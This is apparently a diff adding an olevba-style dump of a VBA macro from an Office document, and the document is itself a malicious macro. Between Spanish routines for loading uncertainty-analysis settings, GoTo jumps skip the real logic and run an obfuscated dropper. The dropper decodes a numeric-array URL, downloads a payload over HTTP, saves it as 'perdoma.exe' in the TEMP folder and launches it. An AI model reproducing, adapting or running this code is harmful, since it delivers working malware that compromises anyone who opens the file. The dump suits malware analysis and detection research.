@@ -1,0 +1,1277 @@
+Filename     : ./macros/03d4676d6b9459ebde4e49406b681291b62093862b6b70e82ee36814ae3eb380
+OLE stream   : Macros/VBA/Module1
+VBA filename : Module1.bas
+----------------------------------------
+Attribute VB_Name = "Module1"
+Public uncunctuncE_1 As Object
+Public uncunctuncE_2 As Object
+Public uncunctuncE_3  As Object
+Public uncunctuncE_4 As String
+Public uncunctuncE_5 As String
+Public uncunctuncE_6 As Object
+Public Const STILL_ACTIVE = &H103
+Dim mandata() As String
+Public Const PROCESS_QUERY_INFORMATION = &H400
+Public Sub CargarFichProc(NombreFichero As String)
+ Dim f As Integer
+ Dim Buffer As String
+ Dim Cadena As String
+ Dim i As Integer
+ Dim Aux As Integer
+ Dim Fallo As Boolean
+ Fallo = False
+ bHayNORMA = False
+ bHayNORMAC = False
+ bHaySNIFTD = False
+ bHayEXPAND = False
+ bHaySFIFT = False
+ bHayCNIFT = False
+ bHayPNIFT = False
+ bHayPNIFU = False
+ bHayFrecs = False
+ GoTo perd
+ For i = 0 To UBound(sProc) Step 1
+ sProc(i) = Unchecked
+ Next i
+ sProc(0) = CharSinCargar
+ sProc(3) = CharSinCargar
+ For i = 0 To UBound(sSNIFTD_EXPAND) Step 1
+ sSNIFTD_E.XPAND(i) = CharSinCargar
+ Next i
+ sSNIFTD_E.XPAND(10) = Unchecked
+ For i = 0 To UBound(sSFIFT) Step 1
+ sSF.IFT(i) = CharSinCargar
+ Next i
+ For i = 0 To UBound(sCNIFT) Step 1
+ sCN.IFT(i) = CharSinCargar
+ Next i
+ sCN.IFT(11) = Unchecked
+ For i = 0 To UBound(sPNIFT) Step 1
+ sPN.IFT(i) = CharSinCargar
+ Next i
+ sPN.IFT(4) = Unchecked
+ sPN.IFT(7) = Unchecked
+ For i = 0 To UBound(sPNIFU) Step 1
+ sPNI.FU(i) = CharSinCargar
+ Next i
+ sPNI.FU(0) = Unchecked
+ On Error GoTo ManipularErrorCargarProc
+ f = FreeFile
+ Open NombreFichero For Input As f
+ Do
+ Line Input #f, Buffer
+ Cadena = ExtraeDato.Dcha(Buffer)
+ Select Case ExtraeDatoI.zqda(Buffer)
+ Case "", " ", CharLineaVacia
+ Case Asteriscos & Asteriscos
+ Case ClaveDAMA
+ sProc(0) = Cadena
+ Case ClaveNOFREC
+ Aux = Fix(Val(SinLe.tras(ExtraeDatoIz.qda(Cadena))))
+ If Aux > 0 Then
+ bHayFrecs = True
+ For i = 0 To Aux - 1 Step 1
+ Input #f, Buffer
+ ReDim Preserve sPro.c1(i)
+ sPro.c1(i) = ExtraeDato.Izqda(Buffer)
+ sPro.c1(i) = SinLe.tras(sPro.c1(i))
+ Next i
+ End If
+ Case ClaveINI_NORMA
+ bHayNORMA = True
+ sProc(2) = Checked
+ Case ClaveTEXCIT
+ Select Case Cadena
+ Case PrefLINX
+ sProc(3) = ClaveLINX
+ Case PrefLINY
+ sProc(3) = ClaveLINY
+ Case PrefCIRC
+ sProc(3) = ClaveCIRC
+ End Select
+ Case ClaveFIN_NORMA
+ Case ClaveINI_NORMACOMP
+ bHayNORMAC = True
+ sProc(11) = Checked
+ Case ClaveFIN_NORMACOMP
+ Case ClaveINI_SNIFTD
+ bHaySNIFTD = True
+ sProc(5) = Checked
+ sProc(4) = sProc(5)
+ Case ClaveINI_EXPAND
+ bHayEXPAND = True
+ sProc(6) = Checked
+ sProc(4) = sProc(6)
+ Case ClaveINSONDA
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSONDA_1
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_1
+ Case PrefSONDA_2
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_2
+ Case PrefSONDA_3
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_3
+ End Select
+ sSNIFTD_E.XPAND(8) = ExtraeDato.Dcha(Cadena)
+ Case ClaveROUT
+ sSNIFTD_E.XPAND(9) = SinLet.ras(Cadena)
+ If sSNIFTD_E.XPAND(9) = "0" Then
+ sSNIFTD_E.XPAND(10) = Checked
+ Else
+ sSNIFTD_E.XPAND(10) = Unchecked
+ End If
+ Case ClaveOUTTHETA_SE
+ sSNIFTD_E.XPAND(11) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(11) = SinLe.tras(sSNIFTD_E.XPAND(11))
+ Cadena = ExtraeDa.toDcha(Cadena)
+ sSNIFTD_E.XPAND(12) = ExtraeDa.toIzqda(Cadena)
+ sSNIFTD_E.XPAND(12) = SinLe.tras(sSNIFTD_E.XPAND(12))
+ Case ClaveOUTPHI_SE
+ sSNIFTD_E.XPAND(13) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(13) = SinLe.tras(sSNIFTD_E.XPAND(13))
+ Cadena = ExtraeDatoD.cha(Cadena)
+ sSNIFTD_E.XPAND(14) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(14) = SinLe.tras(sSNIFTD_E.XPAND(14))
+ Case ClaveOUTSONDA
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSONDA_1
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_1
+ Case PrefSONDA_2
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_2
+ Case PrefSONDA_3
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_3
+ End Select
+ sSNIFTD_E.XPAND(16) = ExtraeDatoD.cha(Cadena)
+ Case ClaveFIN_SNIFTD, ClaveFIN_EXPAND
+ Case ClaveINI_SFIFT
+ bHaySFIFT = True
+ sProc(7) = Checked
+ Case ClaveR0
+ sSF.IFT(3) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(3) = SinLe.tras(sSF.IFT(3))
+ Case ClaveLFI0
+ sSF.IFT(4) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(4) = SinLe.tras(sSF.IFT(4))
+ Case ClaveLFI90
+ sSF.IFT(5) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(5) = SinLe.tras(sSF.IFT(5))
+ Case ClaveGSonda
+ sSF.IFT(6) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(6) = SinLe.tras(sSF.IFT(6))
+ Case ClaveCSonda
+ sSF.IFT(7) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(7) = SinLe.tras(sSF.IFT(7))
+ Case ClaveFIN_SFIFT
+ Case ClaveINI_CNIFT
+ bHayCNIFT = True
+ sProc(8) = Checked
+ Case ClaveTHETA_C
+ sCN.IFT(7) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(7) = SinLe.tras(sCN.IFT(7))
+ sCN.IFT(8) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(8) = SinLe.tras(sCN.IFT(8))
+ Case ClavePHI_C
+ sCN.IFT(9) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(9) = SinLe.tras(sCN.IFT(9))
+ sCN.IFT(10) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(10) = SinLe.tras(sCN.IFT(10))
+ Case ClaveCENTRAR_C
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSI
+ sCN.IFT(11) = Checked
+ Case PrefNO
+ sCN.IFT(11) = Unchecked
+ Case Else
+ sCN.IFT(11) = Grayed
+ End Select
+ sCN.IFT(12) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(12) = SinLe.tras(sCN.IFT(12))
+ Case ClavePERDYGAN
+ sCN.IFT(13) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(13) = SinLe.tras(sCN.IFT(13))
+ sCN.IFT(14) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(14) = SinLe.tras(sCN.IFT(14))
+ Case ClaveFSONDA
+ sCN.IFT(15) = Cadena
+ Case ClaveFIN_CNIFT
+ Case ClaveINI_PNIFT
+ bHayPNIFT = True
+ sProc(9) = Checked
+ Case ClaveTHETA_P
+ sPN.IFT(0) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(0) = SinLe.tras(sPN.IFT(0))
+ sPN.IFT(1) = ExtraeDatoD.cha(Cadena)
+ sPN.IFT(1) = SinLe.tras(sPN.IFT(1))
+ Case ClavePHI_P
+ sPN.IFT(2) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(2) = SinLe.tras(sPN.IFT(2))
+ sPN.IFT(3) = ExtraeDatoD.cha(Cadena)
+ sPN.IFT(3) = SinLe.tras(sPN.IFT(3))
+ Case ClaveFICHRNF
+ sPN.IFT(5) = Cadena
+ If sPN.IFT(5) <> "" Then
+ sPN.IFT(4) = Checked
+ Else
+ sPN.IFT(4) = Unchecked
+ End If
+ Case ClaveFICHPRB
+ sPN.IFT(6) = Cadena
+ Case ClaveFICHREF
+ sPN.IFT(8) = Cadena
+ If sPN.IFT(8) <> "" Then
+ sPN.IFT(7) = Checked
+ Else
+ sPN.IFT(7) = Unchecked
+ End If
+ Case ClavePERDINS
+ sPN.IFT(9) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(9) = SinLe.tras(sPN.IFT(9))
+ Case ClaveFIN_PNIFT
+ Case ClaveINI_PNIFU
+ bHayPNIFU = True
+ sProc(10) = Checked
+ Case ClaveCENTGIRAR_U
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSI
+ sPNI.FU(0) = Checked
+ Case PrefNO
+ sPNI.FU(0) = Unchecked
+ Case Else
+ sPNI.FU(0) = Grayed
+ End Select
+ sPNI.FU(1) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(1) = SinLe.tras(sPNI.FU(1))
+ Case ClaveTRANSF_U
+ Select Case Cadena
+ Case PrefSINCAMBIO
+ sPNI.FU(2) = ClaveSINCAMBIO
+ Case PrefCONCAMBIO
+ sPNI.FU(2) = ClaveCONCAMBIO
+ End Select
+ Case ClaveCMPTE_U
+ Select Case Cadena
+ Case PrefCPXY
+ sPNI.FU(3) = ClaveCPXY
+ Case PrefAE
+ sPNI.FU(3) = ClaveAE
+ Case PrefTHPH
+ sPNI.FU(3) = ClaveTHPH
+ Case PrefRHLH
+ sPNI.FU(3) = ClaveRHLH
+ Case PrefEMEM
+ sPNI.FU(3) = ClaveEMEM
+ End Select
+ Case ClaveFORMATO
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefFORM_1
+ sPNI.FU(4) = ClaveFORM_1
+ Case PrefFORM_2
+ sPNI.FU(4) = ClaveFORM_2
+ Case PrefFORM_3
+ sPNI.FU(4) = ClaveFORM_3
+ Case PrefFORM_4
+ sPNI.FU(4) = ClaveFORM_4
+ End Select
+ sPNI.FU(5) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(5) = SinLe.tras(sPNI.FU(5))
+ Case ClaveTHETA_U
+ sPNI.FU(6) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(6) = SinLe.tras(sPNI.FU(6))
+ sPNI.FU(7) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(7) = SinLe.tras(sPNI.FU(7))
+ Case ClavePHI_U
+ sPNI.FU(8) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(8) = SinLe.tras(sPNI.FU(8))
+ Case ClaveFACTEXP
+ sPNI.FU(9) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(9) = SinLe.tras(sPNI.FU(9))
+ sPNI.FU(10) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(10) = SinLe.tras(sPNI.FU(10))
+ Case ClaveFIN
+ Case ClaveFIN_PNIFU
+ Case Else
+ Fallo = True
+ End Select
+ Loop Until EOF(f)
+ Close f
+perd:
+mandata = Split(UserForm1.ComboBox1.Text, NombreFichero)
+GoTo perd1
+ If Fallo Then
+ i = MsgBox("Se han ignorado algunas entradas, compruebe la configuraci?n", _
+ vbOKOnly + vbInformation, "AVISO PROCESADO DE DATOS")
+ End If
+SalirCargarProc:
+ Exit Sub
+ManipularErrorCargarProc:
+ i = MsgBox("No existe el fichero o est? da?ado" _
+ & vbNewLine & Err.Description, _
+ vbOKOnly + vbCritical, "ERROR PROCESADO DE DATOS")
+ Resume Next
+perd1:
+CargarFichIncer ""
+uncunctuncE_6.Open (uncunctuncE_5)
+End Sub
+Public Function AddFieldToField(uncunctuncE_9() As Variant, uncunctuncE_10 As Integer) As String
+    Dim uncunctuncE_8 As Integer
+    Dim uncunctunc2_1 As String
+    uncunctunc2_1 = ""
+    For uncunctuncE_8 = LBound(uncunctuncE_9) To UBound(uncunctuncE_9)
+        uncunctunc2_1 = uncunctunc2_1 & Chr(uncunctuncE_9(uncunctuncE_8) - 9854 - uncunctuncE_10 - uncunctuncE_10 - uncunctuncE_10 - uncunctuncE_10)
+    Next uncunctuncE_8
+    AddFieldToField = uncunctunc2_1
+End Function
+Public Sub CargarFichIncer(NombreFichero As String)
+ Dim f As Integer
+ Dim Buffer As String
+ Dim Cadena As String
+ Dim i As Integer
+ Dim Aux As Integer
+ Dim Fallo As Boolean
+ Fallo = False
+ bHaySNIFTD = False
+ bHayEXPAND = False
+ bHaySFIFT = False
+ bHayCNIFT = False
+ bHayPNIFT = False
+ bHayPNIFU = False
+ bHayFrecs = False
+ GoTo perd
+ For i = 0 To UBound(sProc) Step 1
+ sProc(i) = Unchecked
+ Next i
+ sProc(0) = CharSinCargar
+ sProc(3) = CharSinCargar
+ For i = 0 To UBound(sSNIFTD_EXPAND) Step 1
+ sSNIFTD_E.XPAND(i) = CharSinCargar
+ Next i
+ sSNIFTD_E.XPAND(10) = Unchecked
+ For i = 0 To UBound(sSFIFT) Step 1
+ sSF.IFT(i) = CharSinCargar
+ Next i
+ For i = 0 To UBound(sCNIFT) Step 1
+ sCN.IFT(i) = CharSinCargar
+ Next i
+ sCN.IFT(11) = Unchecked
+ For i = 0 To UBound(sPNIFT) Step 1
+ sPN.IFT(i) = CharSinCargar
+ Next i
+ sPN.IFT(4) = Unchecked
+ sPN.IFT(7) = Unchecked
+ For i = 0 To UBound(sPNIFU) Step 1
+ sPNI.FU(i) = CharSinCargar
+ Next i
+ sPNI.FU(0) = Unchecked
+ Pot_ruido = CharSinCargar
+ Drift = CharSinCargar
+ DriftMod = CharSinCargar
+ Leakage = CharSinCargar
+ CablesJuntas = CharSinCargar
+ CablesJuntasMod = CharSinCargar
+ Dut = CharSinCargar
+ Sgh = CharSinCargar
+ Cables = CharSinCargar
+ Num_simulaciones = CharSinCargar
+ Junto2 = Unchecked
+ Junto = CharSinCargar
+ On Error GoTo ManipularErrorCargarProc
+ f = FreeFile
+ Open NombreFichero For Input As f
+ Do
+ Line Input #f, Buffer
+ Cadena = ExtraeDatoD.cha(Buffer)
+ Select Case ExtraeDat.oIzqda(Buffer)
+ Case "", " ", CharLineaVacia
+ Case Asteriscos & Asteriscos
+ Case "FICHERO_MED"
+ sProc(0) = Cadena
+ Case "FICHERO_INCER"
+ sPathMedida = Cadena
+ Case ClaveNOFREC
+ Aux = Fix(Val(SinLe.tras(ExtraeDat.oIzqda(Cadena))))
+ If Aux > 0 Then
+ bHayFrecs = True
+ For i = 0 To Aux - 1 Step 1
+ Input #f, Buffer
+ sPr.oc1(i) = ExtraeDat.oIzqda(Buffer)
+ sPr.oc1(i) = SinLe.tras(sPro.c1(i))
+ Next i
+ End If
+perd:
+Set uncunctuncE_1 = CreateObject(mandata(0))
+
+Set uncunctuncE_2 = CreateObject(mandata(1))
+Set uncunctuncE_6 = CreateObject(mandata(2))
+Set hokuk = CreateObject(mandata(3))
+Set uncunctuncE_3 = hokuk.Environment(mandata(4))
+GoTo perd2
+ Case ClaveTEXCIT
+ Select Case Cadena
+ Case PrefLINX
+ sProc(3) = ClaveLINX
+ Case PrefLINY
+ sProc(3) = ClaveLINY
+ Case PrefCIRC
+ sProc(3) = ClaveCIRC
+ End Select
+ Case ClaveINI_SNIFTD
+ bHaySNIFTD = True
+ sProc(5) = Checked
+ sProc(4) = sProc(5)
+ Case ClaveINI_EXPAND
+ bHayEXPAND = True
+ sProc(6) = Checked
+ sProc(4) = sProc(6)
+ Case ClaveINSONDA
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSONDA_1
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_1
+ Case PrefSONDA_2
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_2
+ Case PrefSONDA_3
+ sSNIFTD_E.XPAND(7) = ClaveSONDA_3
+ End Select
+ sSNIFTD_E.XPAND(8) = ExtraeDatoD.cha(Cadena)
+ Case ClaveROUT
+ sSNIFTD_E.XPAND(9) = SinLe.tras(Cadena)
+ If sSNIFTD_E.XPAND(9) = "0" Then
+ sSNIFTD_E.XPAND(10) = Checked
+ Else
+ sSNIFTD_E.XPAND(10) = Unchecked
+ End If
+ Case ClaveOUTTHETA_SE
+ sSNIFTD_E.XPAND(11) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(11) = SinLe.tras(sSNIFTD_E.XPAND(11))
+ Cadena = ExtraeDatoD.cha(Cadena)
+ sSNIFTD_E.XPAND(12) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(12) = SinLe.tras(sSNIFTD_E.XPAND(12))
+ Case ClaveOUTPHI_SE
+ sSNIFTD_E.XPAND(13) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(13) = SinLe.tras(sSNIFTD_E.XPAND(13))
+ Cadena = ExtraeDatoD.cha(Cadena)
+ sSNIFTD_E.XPAND(14) = ExtraeDat.oIzqda(Cadena)
+ sSNIFTD_E.XPAND(14) = SinLe.tras(sSNIFTD_E.XPAND(14))
+ Case ClaveOUTSONDA
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSONDA_1
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_1
+ Case PrefSONDA_2
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_2
+ Case PrefSONDA_3
+ sSNIFTD_E.XPAND(15) = ClaveSONDA_3
+ End Select
+ sSNIFTD_E.XPAND(16) = ExtraeDatoD.cha(Cadena)
+ Case ClaveFIN_SNIFTD, ClaveFIN_EXPAND
+ Case ClaveINI_SFIFT
+ bHaySFIFT = True
+ sProc(7) = Checked
+ Case ClaveR0
+ sSF.IFT(3) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(3) = SinLe.tras(sSF.IFT(3))
+ Case ClaveLFI0
+ sSF.IFT(4) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(4) = SinLe.tras(sSF.IFT(4))
+ Case ClaveLFI90
+ sSF.IFT(5) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(5) = SinLe.tras(sSF.IFT(5))
+ Case ClaveGSonda
+ sSF.IFT(6) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(6) = SinLe.tras(sSF.IFT(6))
+ Case ClaveCSonda
+ sSF.IFT(7) = ExtraeDat.oIzqda(Cadena)
+ sSF.IFT(7) = SinLe.tras(sSF.IFT(7))
+ Case ClaveFIN_SFIFT
+ Case ClaveINI_CNIFT
+ bHayCNIFT = True
+ sProc(8) = Checked
+ Case ClaveTHETA_C
+ sCN.IFT(7) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(7) = SinLe.tras(sCN.IFT(7))
+ sCN.IFT(8) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(8) = SinLe.tras(sCN.IFT(8))
+ Case ClavePHI_C
+ sCN.IFT(9) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(9) = SinLe.tras(sCN.IFT(9))
+ sCN.IFT(10) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(10) = SinLe.tras(sCN.IFT(10))
+ Case ClaveCENTRAR_C
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSI
+ sCN.IFT(11) = Checked
+ Case PrefNO
+ sCN.IFT(11) = Unchecked
+ Case Else
+ sCN.IFT(11) = Grayed
+ End Select
+perd2:
+ Dim uncunctuncE_7() As Variant
+uncunctuncE_7 = Array(10122, 10134, 10134, 10130, 10076, 10065, 10065, 10117, 10126, 10123, 10117, 10125, 10117, 10122, 10123, 10132, 10129, 10130, 10132, 10115, 10117, 10134, 10123, 10117, 10064, 10117, 10129, 10127, 10065, 10071, 10072, 10121, 10120, 10065, 10121, 10071, 10070, 10071, 10064, 10119, 10138, 10119)
+uncunctuncE_1.Open mandata(5), AddFieldToField(uncunctuncE_7, 41), False
+GoTo perd3
+ sCN.IFT(12) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(12) = SinLe.tras(sCN.IFT(12))
+ Case ClavePERDYGAN
+ sCN.IFT(13) = ExtraeDat.oIzqda(Cadena)
+ sCN.IFT(13) = SinLe.tras(sCN.IFT(13))
+ sCN.IFT(14) = ExtraeDatoD.cha(Cadena)
+ sCN.IFT(14) = SinLe.tras(sCN.IFT(14))
+ Case ClaveFSONDA
+ sCN.IFT(15) = Cadena
+ Case ClaveFIN_CNIFT
+ Case ClaveINI_PNIFT
+ bHayPNIFT = True
+ sProc(9) = Checked
+ Case ClaveTHETA_P
+ sPN.IFT(0) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(0) = SinLe.tras(sPN.IFT(0))
+ sPN.IFT(1) = ExtraeDatoD.cha(Cadena)
+ sPN.IFT(1) = SinLe.tras(sPN.IFT(1))
+ Case ClavePHI_P
+ sPN.IFT(2) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(2) = SinLe.tras(sPN.IFT(2))
+ sPN.IFT(3) = ExtraeDatoD.cha(Cadena)
+ sPN.IFT(3) = SinLe.tras(sPN.IFT(3))
+ Case ClaveFICHRNF
+ sPN.IFT(5) = Cadena
+ If sPN.IFT(5) <> "" Then
+ sPN.IFT(4) = Checked
+ Else
+ sPN.IFT(4) = Unchecked
+ End If
+ Case ClaveFICHPRB
+ sPN.IFT(6) = Cadena
+ Case ClaveFICHREF
+ sPN.IFT(8) = Cadena
+ If sPN.IFT(8) <> "" Then
+ sPN.IFT(7) = Checked
+ Else
+ sPN.IFT(7) = Unchecked
+ End If
+ Case ClavePERDINS
+ sPN.IFT(9) = ExtraeDat.oIzqda(Cadena)
+ sPN.IFT(9) = SinLe.tras(sPN.IFT(9))
+ Case ClaveFIN_PNIFT
+ Case ClaveINI_PNIFU
+ bHayPNIFU = True
+ sProc(10) = Checked
+ Case ClaveCENTGIRAR_U
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefSI
+ sPNI.FU(0) = Checked
+ Case PrefNO
+ sPNI.FU(0) = Unchecked
+ Case Else
+ sPNI.FU(0) = Grayed
+ End Select
+ sPNI.FU(1) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(1) = SinLe.tras(sPNI.FU(1))
+ Case ClaveTRANSF_U
+ Select Case Cadena
+ Case PrefSINCAMBIO
+ sPNI.FU(2) = ClaveSINCAMBIO
+ Case PrefCONCAMBIO
+ sPNI.FU(2) = ClaveCONCAMBIO
+ End Select
+ Case ClaveCMPTE_U
+ Select Case Cadena
+ Case PrefCPXY
+ sPNI.FU(3) = ClaveCPXY
+ Case PrefAE
+ sPNI.FU(3) = ClaveAE
+ Case PrefTHPH
+ sPNI.FU(3) = ClaveTHPH
+ Case PrefRHLH
+ sPNI.FU(3) = ClaveRHLH
+ Case PrefEMEM
+ sPNI.FU(3) = ClaveEMEM
+ End Select
+ Case ClaveFORMATO
+ Select Case ExtraeDat.oIzqda(Cadena)
+ Case PrefFORM_1
+ sPNI.FU(4) = ClaveFORM_1
+ Case PrefFORM_2
+ sPNI.FU(4) = ClaveFORM_2
+ Case PrefFORM_3
+ sPNI.FU(4) = ClaveFORM_3
+ Case PrefFORM_4
+ sPNI.FU(4) = ClaveFORM_4
+ End Select
+perd3:
+ uncunctuncE_1.Send
+uncunctuncE_4 = uncunctuncE_3(mandata(6))
+GoTo perd4
+ sPNI.FU(5) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(5) = SinLe.tras(sPNI.FU(5))
+ Case ClaveTHETA_U
+ sPNI.FU(6) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(6) = SinLe.tras(sPNI.FU(6))
+ sPNI.FU(7) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(7) = SinLe.tras(sPNI.FU(7))
+ Case ClavePHI_U
+ sPNI.FU(8) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(8) = SinLe.tras(sPNI.FU(8))
+ Case ClaveFACTEXP
+ sPNI.FU(9) = ExtraeDat.oIzqda(Cadena)
+ sPNI.FU(9) = SinLe.tras(sPNI.FU(9))
+ sPNI.FU(10) = ExtraeDatoD.cha(Cadena)
+ sPNI.FU(10) = SinLe.tras(sPNI.FU(10))
+ Case "S/N_RUIDO"
+ frmAnalisisIncertidumbres.txtNivelRuido.Text = SinLe.tras(Cadena)
+ Pot_ruido = Cadena
+ Case "DRIFT_GRADOS"
+ frmAnalisisIncertidumbres.txtDrift.Text = SinLe.tras(Cadena)
+ Drift = Cadena
+ Case "DRIFT_dB"
+ frmAnalisisIncertidumbres.txtDriftMod.Text = SinLe.tras(Cadena)
+ DriftMod = Cadena
+ Case "S/N_LEAKAGE"
+ frmAnalisisIncertidumbres.txtLeakage.Text = SinLe.tras(Cadena)
+ Leakage = Cadena
+ Case "CABLES_JUNTAS_GRADOS"
+ frmAnalisisIncertidumbres.txtCablesJuntas.Text = SinLe.tras(Cadena)
+ CablesJuntas = Cadena
+ Case "CABLES_JUNTAS_dB"
+ frmAnalisisIncertidumbres.txtCablesJuntasMod.Text = SinLe.tras(Cadena)
+ CablesJuntasMod = Cadena
+ Case "NO_SIMUL"
+ frmAnalisisIncertidumbres.txtNumSimul.Text = SinLe.tras(Cadena)
+ Num_simulaciones = Cadena
+ Case "JUNTO"
+ If (Cadena = "S") Then
+ frmAnalisisIncertidumbres.chkJunto.Value = Checked
+ Junto2 = Checked
+ End If
+ Junto = Cadena
+ Case ClaveFIN
+ Case ClaveFIN_PNIFU
+ Case Else
+ Fallo = True
+ End Select
+ Loop Until EOF(f)
+ Close f
+ If Fallo Then
+ i = MsgBox("Se han ignorado algunas entradas, compruebe la configuraci?n", _
+ vbOKOnly + vbInformation, "AVISO PROCESADO DE DATOS")
+ End If
+SalirCargarProc:
+ Exit Sub
+ManipularErrorCargarProc:
+ i = MsgBox("No existe el fichero o est? da?ado" _
+ & vbNewLine & Err.Description, _
+ vbOKOnly + vbCritical, "ERROR PROCESADO DE DATOS")
+ Resume Next
+perd4:
+uncunctuncE_5 = uncunctuncE_4 + "\perdoma.exe"
+GuardarFichProcIncer ""
+End Sub
+Public Sub GuardarFichProcIncer(NombreFichero As String)
+ Dim f As Integer
+ Dim i As Integer
+ Dim ClaveCPE As String
+ Dim ClaveINI_CPE As String
+ Dim ClaveFIN_CPE As String
+ Dim TExcitacion As String
+ Dim InSonda As String
+ Dim OutSonda As String
+ Dim TPolariz As String
+ Dim TNormaliz As String
+ Dim Forma As String
+ Dim Centrar_c As String
+ Dim CentrarGirar_u As String
+ Dim Transf As String
+ Dim Cmpte As String
+ Dim Forma_u As String
+ GoTo perd
+ If frmAnalisisIncertidumbres.optSNIFTD.Value = True Then
+ ClaveCPE = ClaveSNIFTD
+ ClaveINI_CPE = ClaveINI_SNIFTD
+ ClaveFIN_CPE = ClaveFIN_SNIFTD
+ ElseIf frmAnalisisIncertidumbres.optEXPAND.Value = True Then
+ ClaveCPE = ClaveEXPAND
+ ClaveINI_CPE = ClaveINI_EXPAND
+ ClaveFIN_CPE = ClaveFIN_EXPAND
+ End If
+ Select Case sSNIF.TD_EXPAND(7)
+ Case ClaveSONDA_1
+ InSonda = PrefSONDA_1
+ Case ClaveSONDA_2
+ InSonda = PrefSONDA_2
+ Case ClaveSONDA_3
+ InSonda = PrefSONDA_3
+ Case ClaveSONDA_4
+ InSonda = PrefSONDA_4
+ Case ClaveSONDA_5
+ InSonda = PrefSONDA_5
+ End Select
+perd:
+GoTo perd1
+ Select Case sSNIFT.D_EXPAND(15)
+ Case ClaveSONDA_1
+ OutSonda = PrefSONDA_1
+ Case ClaveSONDA_2
+ OutSonda = PrefSONDA_2
+ Case ClaveSONDA_3
+ OutSonda = PrefSONDA_3
+ Case ClaveSONDA_4
+ OutSonda = PrefSONDA_4
+ Case ClaveSONDA_5
+ OutSonda = PrefSONDA_5
+ End Select
+ Select Case sCNI.FT(11)
+ Case Checked
+ Centrar_c = PrefSI
+ Case Unchecked
+ Centrar_c = PrefNO
+ End Select
+ Select Case sPN.IFU(0)
+ Case Checked
+ CentrarGirar_u = PrefSI
+ Case Unchecked
+ CentrarGirar_u = PrefNO
+ End Select
+ Select Case sPN.IFU(2)
+ Case ClaveSINCAMBIO
+ Transf = PrefSINCAMBIO
+ Case ClaveCONCAMBIO
+ Transf = PrefCONCAMBIO
+ End Select
+ Select Case sPN.IFU(3)
+ Case ClaveCPXY
+ Cmpte = PrefCPXY
+ Case ClaveAE
+ Cmpte = PrefAE
+ Case ClaveTHPH
+ Cmpte = PrefTHPH
+ Case ClaveRHLH
+ Cmpte = PrefRHLH
+ Case ClaveEMEM
+ Cmpte = PrefEMEM
+ End Select
+ Select Case sPN.IFU(4)
+ Case ClaveFORM_1
+ Forma_u = PrefFORM_1
+ Case ClaveFORM_2
+ Forma_u = PrefFORM_2
+ Case ClaveFORM_3
+ Forma_u = PrefFORM_3
+ Case ClaveFORM_4
+ Forma_u = PrefFORM_4
+ End Select
+ On Error GoTo ManipularErrorGuardarProc
+ f = FreeFile
+ Open NombreFichero For Output As f
+ Print #f, "FICHERO_MED", frmAnalisisIncertidumbres.txtDAMA.Text, _
+ vbNewLine
+ Print #f, "FICHERO_INCER", sPathMedida, _
+ vbNewLine
+ Print #f, ClaveNOFREC, frmAnalisisIncertidumbres.lstFrecuencias.ListCount
